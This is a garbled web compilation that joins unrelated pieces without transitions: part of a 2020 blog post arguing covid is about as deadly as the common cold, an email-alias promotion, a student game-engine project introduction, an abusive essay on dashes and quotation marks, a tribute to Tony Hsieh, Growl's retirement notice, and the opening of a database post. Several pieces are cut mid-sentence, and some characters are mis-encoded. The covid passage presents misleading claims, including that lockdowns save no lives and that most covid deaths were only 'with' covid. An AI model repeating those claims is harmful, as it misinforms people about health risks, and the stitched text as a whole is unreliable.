1918 flu pandemic, and compared that to covid. But what about the fatality rate of the common cold viruses that are constantly circulating in society? How does covid compare to them?</p><p>Many people think that the common cold viruses are harmless. But in fact, among elderly people with underlying health conditions, they are frequently deadly. <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC5343795/" target="_blank" rel="noreferrer noopener">A study carried out in 2017</a> found that, among frail elderly people, rhinovirus is actually more deadly than regular influenza. In that study, the 30 day mortality for frail elderly people admitted to hospital due to a rhinovirus infection was 10% . For frail elderly people admitted to hospital due to influenza, 30 day mortality was 7% .</p><p>What is my point?  If you are old and frail, and have underlying health conditions, then even that most harmless of all infections, the so called “common cold”, can be deadly. In fact, it often is. Covid-19 is not a unique disease, and does not appear to have a noticeably higher mortality rate than the so called “common cold”.</p><p>There is one final aspect to all this that needs to be discussed. And that is the effect of covid on overall mortality. If it turns out that covid has no effect on overall mortality, then that really brings in to question why we are locking down, since we’re not actually preventing any deaths. So, what is the effect of covid on overall mortality?</p><p>Let’s look at Sweden, since that is perhaps the country that has taken the most relaxed approach of any to preventing spread, and which should therefore also reasonably be expected to have had the highest impact on its overall death rate. From January to September 2020, <a href="https://cornucopia.cornubot.se/2020/10/september-2020-least-deadly-month-ever.html" target="_blank" rel="noreferrer noopener">Sweden experienced 687 deaths per 100,000 population</a>. The last time Sweden had a deadlier year was 2015. Personally, I don’t remember any big deadly pandemic happening in 2015.</p><p>In fact, 2020 is so far one of the least deadly years in Swedish history, and is largely in line with the average for the preceding five years. To be precise, it is 2,7% higher than the average for the preceding five years, which is well within the margin of error. In 2019, mortality was 6% lower than the average, so it should be expected that 2020 would have a slightly higher mortality than average, even without covid.</p><p>What does this mean? It means that covid, a supposedly deadly viral pandemic, has not killed enough Swedes to have any noticeable impact on overall mortality.</p><p>How can this be explained, when we know that 6,000 Swedes have died of covid?</p><p>As I see it, there are two possible explanations. The first is that most people who died “of” covid actually died with covid. In other words, they had a positive covid test and were therefore characterized as covid deaths, when the actual cause of death was something else. The second is that most people who died of covid were so old, and so frail, and had so many underlying health conditions, that even without covid, they would have died by now. There are no other reasonable explanations.</p><p>I am not saying that covid is nothing, or that it doesn’t exist. I am saying that it is a virus with a marginal effect on longevity. And yet, public policy in most countries has been driven by doomsday scenarios based on completely unrealistic numbers.  To put it simply, we’ve acted like we’re dealing with a global ebola outbreak, when covid is much more like the common cold.</p><p>UPDATE (26th October 2020): After SCB updated their numbers it has become clear that September 2020 was in fact the second least deadly month in Swedish history, not the least deadly month. That award goes to June 2019.</p><p>You might also enjoy reading my article <a href="https://sebastianrushworth.com/2020/09/19/covid-19-does-sweden-have-herd-immunity/" target="_blank" rel="noreferrer noopener">about why I think Sweden has herd immunity</a>, or enjoy watching <a href="https://sebastianrushworth.com/2020/10/13/covid-podcast-with-ivor-cummins/" target="_blank" rel="noreferrer noopener">my conversation with Ivor Cummins of Fat Emperor about covid-19</a>.</p><section id="blog_subscription-17"></section><div><div><p> I am a practicing physician in Stockholm, Sweden.

        <blockquote>
<p>Why do I receive so many spams?</p>
</blockquote>

<p>When this question was asked by my girlfriend (now wife ðŸ˜…), my immediate answer was “Stop giving away your email” and I suggested creating a secondary email for “suspicious” websites. Also, using the same email everywhere is like leaving the same <strong>footprint</strong> on the Internet, allowing advertisers to <code>cross-reference</code> your online behavior.</p>



<p>
    <img src="https://simplelogin.io/blog/footprint.jpeg" alt="Fingerprint image">
</p>


<p>She followed the advice, created a second email and was happy at first. But now she doesn’t even check this mailbox as there are so many spams in it ðŸ’�ðŸ�»â€�â™€ï¸�.</p>

<p>So creating a second email is not a true solution. She needs more than 2, maybe hundreds. <strong>And why not an email for each website</strong>? But she cannot go to Gmail or Outlook to create hundreds of accounts, this is unmanageable. There must be a better way.</p>

<p>The solution is <code>email alias</code>. An alias is a normal email address but all emails sent to an alias will be <strong>forwarded</strong> to your real email address. Alias acts therefore as a <strong>shield</strong> (or a proxy) for your real email address. An alias can be disabled anytime, making the spams stop.</p>

<p>Nowadays, some websites allow to unsubscribe quickly but a lot of them still make unsubscribing a difficult process. Some wouldn’t even honor the request. And this doesn’t stop the websites from cross-referencing your data with your email being the common key.</p>

<p>Let’s make spammers’ life harder with email alias!</p>

<h2 id="introduction">Introduction<a href="#introduction" title="Permanent link">¶</a></h2>
<p>The Isetta Engine is a student-driven project about demystifying game engine development and providing a roadmap and relevant knowledge for novice developers. To do so, <a href="https://isetta.io/team/">our team</a> will make a game engine by ourselves starting from a collection of base frameworks, and document the process, pitfalls, and advice for our audience with periodic blogs. Besides that, we will conduct interviews with experienced professionals to augment our novice perspective. We believe the novice perspective from our blogs and expert perspective from the interviews will nicely come together and form a complete document to help people get started. </p>
<p>The reason we think more work needs to be done in this field is that too many game engine developers wait until the completion of the engine, typically years, to talk about their development. For studios, this is because they consider the final product to be the game, not the engine. For others, it may be because the engine is what they see as valuable, not the writing. As a result, these talks typically lose the minutiae of the actual daily struggles that took place in the development process. There are others who document their development which has been going on for years, which makes it a daunting task for newcomers to start following along. </p>
<p>Although the project is aimed at helping novice developers, this is not to be used as a sole source of learning engine development. Being new engine developers ourselves, we can't guarantee the way we develop the engine will be correct, which is why interviews will help the project remain grounded. This means others who are learning can use what we've done as a guide and not necessarily the ground truth. The blogs won't be a walkthrough/tutorial/step-by-step instructions on how to develop an engine. We are learning as we go and think our journey is what can be valuable to you. </p>
<h3 id="about-the-project">About the Project<a href="#about-the-project" title="Permanent link">¶</a></h3>
<p>This project is being done as a student-pitched project at the <a href="https://www.etc.cmu.edu/">Entertainment Technology Center</a> (ETC). The ETC is an interdisciplinary Master's degree program at Carnegie Mellon University where students' main focus is working on small teams on a project each semester during a 3-month time period. Throughout the semester, a team's work will be presented to faculty and peers with feedback and critique being presented to help aid in the project development. Our particular project idea has gone through multiple iterations to do the following:</p>
<ol>
<li>Simplify the engine to be feasible within 3 months and</li>
<li>Deliver content that would be useful, and hopefully enjoyable, to consume.</li>
</ol>
<p>As of writing this, we've learned that creating content that will satisfy both is difficult and time-consuming, so we will be focusing on writing these milestone-type blogs as well as posting various types of content to test which is the best form of presenting our work. The short project duration also forces us to think clearly about our scope and be lean on the features we include before starting. </p>
<h3 id="schedule">Schedule<a href="#schedule" title="Permanent link">¶</a></h3>
<p>During the course of this project <strong>(08/26 - 12/16, 2018</strong>), a blog post will be published every week to share our thoughts and process, and an interview will be published every 1-2 weeks. The interview schedule depends on our progress on the engine itself, as each interview's topic will be themed around our current work.</p>
<p>For latest schedule, see our <a href="https://isetta.io/schedule/">schedule</a> page.</p>
<h3 id="prerequisites">Prerequisites<a href="#prerequisites" title="Permanent link">¶</a></h3>
<p>Although we will cover some basic features of engine development, it will profoundly help if you have experience in C++ programming and developing software, especially games, as our project won't provide step-by-step instructions on how to do everything. For a list of resources on how to gain related knowledge, please go to the <a href="#Readings">Readings</a> section. Additional resources will be posted on our <a href="https://isetta.io/resources/">resource page</a>.</p>
<p>Another prerequisite is passion for learning game engine development. As you are still reading this, we assume you are as excited about this as we are. This will be a bumpy ride, but you will have us on your side.</p>
<h2 id="research">Research<a href="#research" title="Permanent link">¶</a></h2>
<p>Being a student-pitched ETC project means that the project needed to pass through a pitch process of consulting and convincing faculty in the program. This allowed us to receive feedback about what could be considered a reasonable/manageable scope and where we might hit challenges for a general project. For this project to be a valid ETC project as well as accomplish our mission statement, there needs to be a fine balance between documentation and development. </p>
<p>Before confronting the big monster of engine development and documentation, we thought it would be a good idea to gear up by getting input from people who have actually done this. During our pitch process, we reached out and got the chance to talk to numerous industry professionals and got extremely helpful advice from them. All of these suggestions helped us shape our project into what it is now and provided invaluable knowledge on how to start a game engine. Thus we encourage you, too, to approach professionals and get advice if possible. We've compiled our notes from our conversations with them into a write-up, which will be published soon.</p>
<h3 id="why-another-engine">Why another engine?<a href="#why-another-engine" title="Permanent link">¶</a></h3>
<p>Using an existing game engine like <a href="https://unity3d.com/">Unity</a>, <a href="https://www.unrealengine.com/en-US/what-is-unreal-engine-4">Unreal</a> or <a href="https://www.panda3d.org/">Panda3D</a> is always a handy option to make a game. These well-established engines have a strong collection of tools and APIs so that developers can focus on making the game, not the wheels. However, there is the limitation of not having full control over all systems in the engine as well as not knowing how the engine is processing the game logic and assets. These can obstruct the complex systems of an engine, so although you may have an understanding of how a physics or graphics engine works, each engine operates differently and optimizes for different constraints. </p>
<p>In terms of learning about game engines and how to develop one, these established engines aren't a good source. Panda3D, originally developed by Disney and expanded by past ETC projects, has an older codebase in 2018 with limited community involvement. It is also not using the current industry standard language (C++). Unity and Unreal are both too massive and too cutting-edge to be suitable engine learning material for novices. In addition, Unity's source code isn't publicly available so you technically can't learn from it. The huge codebase sets a high threshold for any beginner to get started.</p>
<h2 id="roadmap">Roadmap<a href="#roadmap" title="Permanent link">¶</a></h2>
<p>The Isetta Engine will support the most primitive form of networked multiplayer twin-stick shooter game. Networked multiplayer was selected to be a part of the engine because it offers significant design and development challenge on every level of the project, and will help differentiate this engine from others being developed. We decided to create the engine in 3D for two reasons: Most AAA engines are 3D, and 3D requires more math and problem solving for us as developers to learn and grow from.</p>
<p>While planning, and before we knew too much about game engines, we had a basic idea of what a game engine would consist of. The image below displays the second/third iteration of what the Isetta engine would look like. We were initially naive thinking we may be able to do both networking as well as physics, however quickly came to grips that would balloon the scope too much. The audio and graphics were and are still planned to be imported from external libraries, and more of the discussion of what is imported and why will be included in a future blog. This diagram of the engine will soon be replaced with more in-depth explanations.</p>
<p><img alt="alt_text" src="https://isetta.io/images/blogs/week-0/pitch_architecture.png" title="Engine Architecture During Pitch"></p>
<h3 id="genre">Genre<a href="#genre" title="Permanent link">¶</a></h3>
<p>As for our choice of the twin-stick shooter genre, we came to the decision after lengthy consideration of the components required to build other game types as well as how that genre would utilize multiplayer. Twin-stick shooters can effectively have little to no physics, which is different from collisions (this will be explained in <a href="https://isetta.io/blogs/week-1/">week 1 blog</a>). Likewise, the information passed between networked sessions is relatively minimal and not too strict on latency. What's more, a twin-stick shooter specializes in simplistic gameplay that doesn't need a world editor or too much design. </p>
<p>In a Skype meeting, <a href="https://waltdestler.com/">Walt Destler</a> explained to us that each game -and more particularly, each genre- requires vastly different netcode solutions. This is also one of the reasons why we prefer netcode over physics, as it can greatly narrow down the genre options. For example, multiplayer shooters, specifically PvP shooters, require small amounts of information to be passed (i.e. bullet and player locations) from server to client with relatively low latency. PvP shooters can also feature client-side prediction <sup id="fnref:0"><a href="#fn:0" rel="footnote">1</a></sup> as well as the additional requirement of lobby/matchmaking with usually more than 2 players. On the other hand, genres like turn-based strategy require large amounts of information to be passed (all units, decisions, resources, etc.) to all users without too much concern for latency or prediction.</p>
<h3 id="building-with-an-example-game">Building with an Example Game<a href="#building-with-an-example-game" title="Permanent link">¶</a></h3>
<p>The other piece of advice we frequently heard from professionals and our faculty alike was the benefit of developing a game in conjunction with the engine. Doing so, they explained, allows you to prove and demonstrate your engine works as expected. The game can also test features to show immediate edge cases of the engine. </p>
<p>Another nicety of developing an engine is that feature creep can be prevented when you keep expanding certain features that won't be utilized in the final product. What the game built from this engine <em>won't</em> be is something original or necessarily fun. However, that's not to say a fun, original game couldn't be created from this engine. The idea of our sample game is to intentionally be derivative so features of a basic twin-stick shooter will be already included in the engine, rather than only specific …</p></article></div></div></div></div>

<p>This article discusses some issues in typography, especially those related to the dash and quotation marks.</p>

<p>I've had some interest in typography since early 1990s of the Mac's Desktop publishing era. Basically, i avidly read books about fontography in libraries or Mac magazines such as MacUser and Macworld, and played with fonts and math typesetting in software such as Microsoft World and Mathematica, including reading Knuth's book on typography and using his TeX system, reading about font technology such as TrueType . So, i am generally acquainted with the concepts and issues of typography, though never worked in any professional area related to it.</p>

<p>I'll have to say, the entire typographical efforts and establishment is rather largely a waste of time, similar in the sense that some “artistic” circles chalk up photography as high art, or that grammarians and pedants have voluminous and vociferous writing style guides and guilds.</p>

<p>Some of the most fartful things the typography-sensitive crowd discuss
or distinguish are: hyphen, en-dash, em-dash,
ligature, kerning, font “design”.
</p>

<p>In general, the function of typography is mainly about issues in printing with respect to the facilitation of reading. So, the major issues involved are: line length, line spacing, serif and sans serif fonts, margin, font sizes, and these pretty much are about it. But since how things are rendered on paper does create differences in the sense of esthetics, sometimes rather pronounced difference, thus typography does indeed have some esthetical elements. However, this is blown out of proportion to stupendous profundity.</p>

<h2>Hyphen and Dash</h2>

<p>Look at these guilded morons go:</p>

<blockquote>

<p>Traditionally an em dash—like so—or spaced em dash — like so — has been used for a dash in running text. The Elements of Typographic Style recommends the more concise spaced en dash – like so – and argues that the length and visual magnitude of an em dash “belongs to the padded and corseted aesthetic of Victorian typography”. The spaced en dash is also the house style for certain major publishers (Penguin, Cambridge University Press, and Routledge among them). However, some longstanding typographical guides such as The Chicago Manual of Style still recommend unspaced em dashes for this purpose. The Oxford Guide to Style (2002, section 5.10.10) acknowledges that …</p>

</blockquote>

<p>The above is from Wikipedia <a target="_blank" href="https://en.wikipedia.org/wiki/Dash">Dash</a>.</p>

<p>Here's my own rule regarding the use of dash: There are 2 kinds: the short dash and the long dash.</p>

<p>For the short one, press the “-” key on your keyboard. For the long one — as a punctuation mark for embedded thought — press it twice. That's it. Simple and functional. And, always include a space around them. (personally, in my writings published on my site, i replace the double dash by a em-dash “—” only because it is prettier, but don't consider it important)</p>

<p>The character “-” you type on your keyboard is the
ASCII 45. (ASCII = American Standard Code for Information Interchange)
[see <a href="http://xahlee.info/comp/unicode_character_representation.html">ASCII Table</a>]
 The character is named “hyphen” in the ASCII standard, but is called “hyphen-minus” by <a href="http://xahlee.info/comp/unicode_index.html">Unicode</a>. (because Unicode has now proper symbols for hyphen, figure-dash, en-dash, em-dash, (math) minus, and quite a few others. Each differ slightly in position, thickness, length.)</p>

<ul>
<li><mark title="U+2D: HYPHEN-MINUS">-</mark> HYPHEN-MINUS</li>
<li><mark title="U+2014: EM DASH">—</mark> EM DASH</li>
<li><mark title="U+2013: EN DASH">–</mark> EN DASH</li>
<li><mark title="U+2012: FIGURE DASH">‒</mark> FIGURE DASH</li>
<li><mark title="U+2212: MINUS SIGN">−</mark> MINUS SIGN</li>
</ul>

<p>As to the typographer's senses and sensibilities about how figure-dash
should be used for numbers and en-dash is used for ranges and em-dash is
for punctuation and hyphen is for word-breaking … etc, i regard them pretty
much all as trifles produced by morons whose brain is inadequate to sense
or tackle the depth of logic and mathematics of languages and structures
but fell into a niche of diddling and went on to procure their efforts
to heighten themselfs among human animals.</p>

<h3>Hypen and Narrow Columns</h3>

<p>For hyphen, as in “breaking a word for words near the margin”, my general advice is to abolish such practice. But what to do in a narrow column of text? My general advice is to abolish the practice of layout using very narrow columns.</p>

<h3>Justification</h3>

<p>
A related concept here is Typographical Justification. My general advice here is to abolish the practice of justification entirely. (leave it jagged at one end; actually as esthetically superior. (and factually functionally superior with regards to reading-facilitation))
</p>

<h4>Ligature</h4>

<p>The typographic conventions of ligatures (as in adjoining certain letter combinations such as “fi” as a single glyph <mark title="U+FB01: LATIN SMALL LIGATURE FI">ﬁ</mark>) should also be abolished.</p>

<h2>Quotation Marks</h2>

<p>Related here is the quotation mark. If you read Wikipedia on
<a target="_blank" href="https://en.wikipedia.org/wiki/Quotation_mark#Summary_table" data-accessed="2020-11-14">Quotation mark#Summary table</a>
, you'll see that there are huge variations. Here's the characters used for quotation.</p>

<table>
<tbody><tr><th>glyph</th><th>Unicode name</th><th>common name</th></tr>
<tr><td><mark title="U+201C: LEFT DOUBLE QUOTATION MARK">“</mark> <mark title="U+201D: RIGHT DOUBLE QUOTATION MARK">”</mark></td><td>LEFT/RIGHT DOUBLE QUOTATION MARK</td><td>Curly double quote</td></tr>
<tr><td><mark title="U+2018: LEFT SINGLE QUOTATION MARK">‘</mark> <mark title="U+2019: RIGHT SINGLE QUOTATION MARK">’</mark></td><td>LEFT/RIGHT SINGLE QUOTATION MARK</td><td>curly single quote</td></tr>
<tr><td><mark title="U+AB: LEFT-POINTING DOUBLE ANGLE QUOTATION MARK">«</mark> <mark title="U+BB: RIGHT-POINTING DOUBLE ANGLE QUOTATION MARK">»</mark></td><td>LEFT/RIGHT-POINTING DOUBLE ANGLE QUOTATION</td><td>French double quote</td></tr>
<tr><td><mark title="U+2039: SINGLE LEFT-POINTING ANGLE QUOTATION MARK">‹</mark> <mark title="U+203A: SINGLE RIGHT-POINTING ANGLE QUOTATION MARK">›</mark></td><td>SINGLE LEFT/RIGHT-POINTING ANGLE QUOTATION</td><td>◇</td></tr>

<tr><td><mark title="U+3008: LEFT ANGLE BRACKET">〈</mark> <mark title="U+3009: RIGHT ANGLE BRACKET">〉</mark></td><td>LEFT/RIGHT ANGLE BRACKET</td><td>◇</td></tr>
<tr><td><mark title="U+3016: LEFT WHITE LENTICULAR BRACKET">〖</mark> <mark title="U+3017: RIGHT WHITE LENTICULAR BRACKET">〗</mark></td><td>LEFT/RIGHT WHITE LENTICULAR BRACKET</td><td>Chinese brackets</td></tr>
<tr><td><mark title="U+3010: LEFT BLACK LENTICULAR BRACKET">【</mark> <mark title="U+3011: RIGHT BLACK LENTICULAR BRACKET">】</mark></td><td>LEFT/RIGHT BLACK LENTICULAR BRACKET</td><td>◇</td></tr>
<tr><td><mark title="U+201F: DOUBLE HIGH-REVERSED-9 QUOTATION MARK">‟</mark></td><td>DOUBLE HIGH-REVERSED-9 QUOTATION MARK</td><td>◇</td></tr>
<tr><td><mark title="U+201E: DOUBLE LOW-9 QUOTATION MARK">„</mark></td><td>DOUBLE LOW-9 QUOTATION MARK</td><td>◇</td></tr>
<tr><td><mark title="U+201A: SINGLE LOW-9 QUOTATION MARK">‚</mark></td><td>SINGLE LOW-9 QUOTATION MARK</td><td>◇</td></tr>
</tbody></table>

<p>Here's a list of conventions of using the double curly quotes:</p>

<ul>
<li><mark title="U+201C: LEFT DOUBLE QUOTATION MARK">“</mark> … <mark title="U+201D: RIGHT DOUBLE QUOTATION MARK">”</mark> UK, USA, Canada, Irish, …</li>
<li><mark title="U+201D: RIGHT DOUBLE QUOTATION MARK">”</mark> … <mark title="U+201D: RIGHT DOUBLE QUOTATION MARK">”</mark> Swedish, Finnish, …</li>
<li><mark title="U+201E: DOUBLE LOW-9 QUOTATION MARK">„</mark> … <mark title="U+201C: LEFT DOUBLE QUOTATION MARK">“</mark> German, Bulgarian, Croatian, Czech, Estonian, Icelandic, Lithuanian, Romanian, Serbian, Slovak, Slovene, Sorbian, …</li>
<li><mark title="U+201E: DOUBLE LOW-9 QUOTATION MARK">„</mark> … <mark title="U+201D: RIGHT DOUBLE QUOTATION MARK">”</mark> Dutch, Polish, Hungarian, …</li>
</ul>

<p>Ain't it bizarre?</p>

<p>For some languages, such as Chinese, it is rational how it
developed into using symbols (e.g. 『』「」《》〈〉【】〖〗) that are
different from European languages's curly quotation marks. However,
among European langs, there are extreme diversity in using the curly
quotation marks. Even the American and English reverse the purpose of
the single and double quotes. Some lang reverses the semantics of the
left/right pair, some lang positions the mark at the bottom instead of
top, some place them in opposite corners (as opposed to both on top),
some lang use the same symbol for both the opening and closing
marker.</p>

<p>One thing interesting about the curly double quotation mark pair is that the two symbols are not bilateral symmetric, but is rotational symmetric. That is, if you rotate the left one 180 degrees, you get the right one. Most other matching pair symbols ()[]{} are bilaterally symmetric (i.e. there is a horizontal line of mirror reflection, and the left/right symbols are vertical mirror reflection of each other.). The fact that the curly quotes have only rotational symmetry, must have contributed significantly the weird diversity in their role as the choice in the opening/closing mark and whether to position them level on a line or at opposite corners. (Note that the Chinese corner brackets 『』「」 also lack a bilateral symmetry, however, their box-corner shape intuitively and uniquely define their placements.)</p>

<h3>Combinatorial Possibilities</h3>

<p>This glyph <mark title="U+201C: LEFT DOUBLE QUOTATION MARK">“</mark> (U+201C) points upper-right. This glyph can be mirrored in a vertical line or horizontal line to create the matching variation, a total of 4 possibilities (think of p q b d).</p>

<p>Here are the different pointing curly quotes from Unicode: <mark title="U+201C: LEFT DOUBLE QUOTATION MARK">“</mark> <mark title="U+201D: RIGHT DOUBLE QUOTATION MARK">”</mark> <mark title="U+201F: DOUBLE HIGH-REVERSED-9 QUOTATION MARK">‟</mark>.</p>

<p>In Unicode, i couldn't find one that is pointing to upper-left. This is
somewhat curious. (If you look at the Wikipedia article on quotation
conventions, you see that actually no language use such a char.)
</p>

<p>I created one with
image here just for the illustration:
<img src="http://wordyenglish.com/musing/i/double_curly_quote_upleft.png" alt="double curly quote upleft.png"></p>

<p>The quotation mark can be placed on the upper line of the text (as in USA convention) or lower line (as in the beginning quotation mark in German convention), a total of 2 possibilities.</p>

<p>So, 4 choices of glyph orientation, 2 possible positions, that's 8 possibilities for the opening quote. Same for the closing quote. So, the total number of styles to use the quotation punctuation with double curly quote is 8×8=64.</p>

<p>It is a good thing that this hasn't been exploited.</p>

<h3>How it should be</h3>

<p>The function of quotation marks is to demarcate text, and as such delimiters, it should be a matching pair such as ( ) [ ] { }, and the pair should have no more than a bilateral symmetry to reflect the natural one-dimensional left/right flow of written text (or, up/down in Asian langs).</p>

<p>If we can rewrite convention, i'd say we all just use simple left/right pairs such as ()[]{}. Since these already have a purpose, then we could use ‹›«»〈〉《》【】〖〗. The French quotation marks « » ‹ › is actually the most sensible here among western langs. (though, other countries using French quotation mark also reverse direction or use the same glyph for both opening and ending. This is idiocy gone berserk.)</p>

<p>But since we cannot restart history nor do we want to break convention radically because we'd create confusion, what i do today personally of writings published on my website, is to use the most ubiquitous convention, the American convention “like this”. (I experimented in using the French convention of «like this», but that turns out to be too in-your-face for English readers)</p>

<h2>Problem of Non-matching Straight Quotation Marks</h2>

<p>It is unfortunate, thru the historical development of the typewriter and the computer keyboard and ASCII, that our keyboard doesn't have the proper matching curly quotes, but instead, has the straight quotes. Here's the symbols and their Unicode name:</p>

<!-- " -->

<ul>
<li>QUOTATION MARK (ASCII 34; U+0022):<mark title="U+22: QUOTATION MARK">"</mark> (double straight quote)</li>
<li>APOSTROPHE (ASCII 39; U+0027):<mark title="U+27: APOSTROPHE">'</mark> (single straight quote)</li>
<li>GRAVE ACCENT (ASCII 96; U+0060):<mark title="U+60: GRAVE ACCENT">`</mark> (backtick)</li>
</ul>

<p>This creates a problem because it forces us to use the same symbol
for a purpose that naturally calls for a matching pair. Using a
single symbol is harder to read. Further, it causes global damage when
one is missing (e.g. caused by typo or transmission error).</p>

<p>It would've been better, if the typewriter was designed with a matching single curly quote. That is, …</p></div></div>

<p>Coincidentally enough, I had decided that I wanted to write a letter to my mentor Tony this weekend, thanking him for the huge impact he’s had on my life. But I suppose that has now morphed into a more public letter. </p>



<p>Being in a zombie, half blurry-eyed state, it’s a little tough to articulate well what Tony has meant to me. We go through life, and a lot of people have an impact on us, and it’s often hard to say that a particular person caused you to take a particular path. But, Tony is one of the few people whom I can definitely say my life would not at all be what it is without him. </p>



<p>I first met him many years ago in Dec 1996 when I was just starting high school. My best friend Jennifer asked me what I was doing for winter break and if I wanted to help out her cousin Tony with his new internet startup. I had no idea what an internet startup was, but I had nothing going on, so I agreed to go. </p>



<p>On the first day of our holiday break, Jennifer and I hopped on the Caltrain from the peninsula (Silicon Valley) to head to his office in SOMA (San Francisco). It was exciting! We couldn’t drive, but we could go to a startup office all by ourselves! I followed Jennifer to the address. I think their office was actually someone’s apartment. And when we got there, there seemingly was no one there. We hung around for a while, and maybe about 10am or so some people started to trickle in – this was my introduction to startup life. </p>



<p>Tony had more or less just graduated from Harvard, as he had spent a few short months at Oracle after graduation, and then decided to quit to build his own company LinkExchange. Leaving a big employer so quickly was highly unusual back then, and he would go on to do many non-conforming things that he was right about. </p>



<p>LinkExchange was an ad network. If you had a website and hosted LinkExchange ad banners, for every 2 impressions you generated, you received 1 free impression of your banner. Back then because the internet was still new, people paid attention to banners and clicked on them like crazy, so this was incredibly effective in helping generate traffic for people. LinkExchange would then sell the remaining ad impressions. They had launched the service earlier that year, and by that December, they were already growing like crazy. </p>



<p>I definitely was *not helpful*. We put together some tables and chairs. And made ethernet cables from scratch. Yes, from scratch. We had to cut cables, splice the individual wires, and insert them into plastic tips and crimp them. I was terrible at this, and Jennifer largely fixed all of my mistakes (as always). Since I was so bad at the ethernet cable making process, they asked me to help them put together an internal webpage to keep all their meetings / schedule together. Great! I could put my basic HTML skills to use. I don’t think they liked the amateurish turquoise background that I chose, so someone at LinkExchange quickly fixed it. </p>



<p>I was more of a nuisance than help, but what I saw that day was super inspiring. Here were a bunch of friends who were getting together to build things. They could wear whatever they wanted, saunter in whenever they wanted, and eat all the pizza they wanted. And they all had varied tasks and were taking business meetings in what looked like a kitchen? There was never a dull moment. It was the dream. Neither of my parents worked in tech and certainly not startups, so this was incredibly eye-opening, and immediately, I knew that this was what I was going to do when I grew up – become an entrepreneur and start companies. Without this exposure to startups in 1996, I don’t think I would have made this realization (if at all) for many years.</p>



<p>Fast forward a few years later. Microsoft bought LinkExchange just 2 years later for a reported $265m. Tony and his college friend Alfred (who also was at LinkExchange) decided to start a startup incubator with their own money. (As a side note, the food at their restaurant in this incubator was fantastic!) This was bold and unique, because Idealab was really the only one doing something somewhat similar at the time. The concept of accelerators or incubators would not come in a big way until years later. </p>



<p>I don’t think Tony knew this, but while in high school, I cold-emailed almost every single one of his portfolio companies to ask them for an internship. I was determined to work at a startup as soon as possible in high school and start my startup career. I ended up working at one of his portfolio companies (probably unbeknownst to him) in the summer of 2000 which really help set me on my path to a career in startups. Often that first opportunity is the hardest to land, and each subsequent opportunity opens more and more doors.</p>



<p>By late 2000, the stock market had crashed and everyone was fleeing startups. Newspapers ran headlines saying that tech was dead and that all programming jobs would be outsourced. They couldn’t have been more wrong, but most people panicked and stopped investing in startups. Tony, was always a first-principles thinker, and he leaned into this and ended up co-leading one of his portfolio companies Zappos. As an e-commerce company that provided free shipping and free returns, Zappos’ margins were razor thin. This scared most VCs. (This would certainly scare me.) But, he believed that it could work if customers had a great experience and would become repeat customers. So, he poured a lot of his own capital into the business when no VC at the time would touch this company. While many VCs pontificate about high level things, he looked at problems from a bottom’s up approach which made his thinking often unique from others. </p>



<p>In order to make the Zappos model work, he needed customer service to be top notch, reliable, and have a lower cost. It was clear to him that this model wouldn’t work in pricey San Francisco. So, he made another bold decision to move the company to Henderson, NV, which could provide all of those things. This was at a time when certainly most people believed you can only build an internet business in the San Francisco Bay Area. In hindsight, when they ended up needing to hire tons of people, being the BEST internet company in the Las Vegas area allowed them to swoop up talent that would have been a huge war to win in San Francisco.  The other thing that was apparent to me, is that the Zappos family was incredibly diverse — and free to be themselves. Tony’s attention to culture and cultivating an open and welcoming work family left a lasting impact on me, and he started doing this well before it became a trend. Like so many of you, his book <em>Delivering Happiness</em> has affected my own thinking.</p>



<p>Fast forward many years, Jennifer and I were working on our own startup, and we were grappling with a particular challenge. We decided to consult Tony and get his advice. In a very Tony-like way, he basically told us to do what we thought was best. I remember feeling frustrated at the time, because…I didn’t know what was best! I had wanted him to tell me what he thought was best! But a good mentor helps you find your own answer – he/she doesn’t tell you the answer.  </p>



<p>In that meeting, he also pulled out a book and told me to read it. The book was <em>Start with Why</em> by Simon Sinek. So I read it. The gist of the book is that to build a great company, you need to go back to first principles. Most people start building a company by trying to sell their product details. “Buy my shoes! They are grey with stripes.” But customers, employees, and everyone want to rally around something much bigger — something inspirational that the company stands for. It actually took me many years to process this and actually figure out how to implement this — I didn’t get this right for LaunchBit, but after marinating on this advice for years, this is what we’ve been striving to do at Hustle Fund. We aren’t just capital deployers. We are trying to create a movement and a philosophy. That particular meeting with Tony is one that I play in my head over and over – I feel like I finally understand what he was getting at and that is what I most wanted to tell him this weekend. </p>



<p>If cynics believe that it’s impossible to get ahead in life without being an asshole, Tony Hsieh is a good example of someone who defies the norm. He was never flashy and always kind and generous to all. I could go on and on in writing this, but thank you, Tony, for helping me in so many ways that you may not have been aware. For your kindness, generosity, and inspiration.</p>



<p>Sending big hugs to the entire Hsieh family whom I consider to be my second family and who took me in during my formative years and had a huge impact on who I am today.</p>

	<p>Growl is being retired after surviving for 17 years. With the announcement of Apple’s new hardware platform, a general shift of developers to Apple’s notification system, and a lack of obvious ways to improve Growl beyond what it is and has been, we’re announcing the retirement of Growl as of today.</p>

<p>It’s been a long time coming. Growl is the project I worked on for the longest period of my open source career. However at WWDC in 2012 everyone on the team saw the writing on the wall. This was my only WWDC. This is the WWDC where Notification Center was announced. Ironically Growl was called Global Notifications Center, before I renamed it to Growl because I thought the name was too geeky. There’s even a sourceforge project for Global Notifications Center still out there if you want to go find it.</p>

<p>We’ve had a lot of support over the years; from our hosting providers at <a href="http://www.networkredux.com/">Network Redux</a>, <a href="http://www.cachefly.com/">CacheFly</a> and others, to all of the apps using our framework, bindings, or any other integration. Special thanks go to <a href="https://adium.im/">Adium</a> and <a href="https://colloquy.app/">Colloquy</a>. Without these two projects having developers who wanted different types notifications, Growl wouldn’t have existed. Without Growl I do not know that we would have any sort of decent notification system in OS X, iOS, Android or who knows what else. </p>

<p>Special thanks goes to <a href="https://www.transifex.com/">Transifex</a> who made localizing into 24 languages a lot easier than anything else we tried. It’s a fantastic product, if you make software please try it. Our localizers were fantastic people and should all be commended for their work. </p>

<p>For developers we recommend transitioning away from Growl at this point. The apps themselves are gone from the app store, however the code itself still lives. Everything from our rake build system to our code is available for use on our <a href="https://github.com/growl/growl/">GitHub page</a></p>

<p>I have to admit, my research blog posts are getting longer and longer. From one
side I find it genuinely encouraging, because if one gets so much information
just by scratching the topic, imagine what’s hidden beneath the surface! One
university professor once said “what could be interesting in databases?”, and
it turns out freaking a lot! On the other side it certainly poses problems for
potential readers. To overcome them I would suggest an interesting approach:
print this blog post out, or open it on your tablet/e-reader, where you can
make notes with a pencil or markers. Now while reading it try to spot ideas
particularly exciting for you and mark them. Along the way there would be
definitely some obscure parts or questions, write them on the sides as well.
You can experiment with the diagrams, changing or extending them, or just
